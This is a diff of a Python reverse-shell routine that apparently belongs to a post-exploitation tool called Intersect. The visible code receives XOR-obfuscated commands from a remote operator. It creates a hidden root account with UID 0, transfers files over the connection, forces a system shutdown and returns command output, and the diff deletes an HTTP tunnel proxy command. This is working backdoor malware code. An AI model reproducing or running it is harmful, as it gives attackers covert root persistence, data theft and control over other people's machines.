@@ -54,11 +54,6 @@ def reversexor():
             os.system("/usr/sbin/useradd -M -o -s /bin/bash -u 0 -l " + acct)
             conn.send(xor("[+] Root account " + acct + " has been created.", PKEY))
 
-        elif cmd2 == ("httunnel"):
-            httpd = SocketServer.ForkingTCPServer(('', PPORT), Proxy)
-            conn.send(xor("[+] Serving HTTP proxy on port "+ PPORT +"", PKEY))
-            httpd.serve_forever()
-
         elif cmd2.startswith('upload'):
             getname = cmd2.split(" ")
             rem_file = getname[1]
@@ -84,6 +79,7 @@ def reversexor():
                 conn.sendall(senddata)
             else:
                 conn.send(xor("[+] File not found!", PKEY))
+
         elif cmd2.startswith("rebootsys"):
             conn.send(xor("[!] Server system is going down for a reboot!", PKEY))
             os.system("shutdown -h now")
@@ -106,6 +102,7 @@ def reversexor():
             conn.send(xor("[!] Shutting down shell!\n", PKEY))
             conn.close()
             sys.exit(0)
+
         elif proc:
             conn.send(xor( stdout , PKEY))
             conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
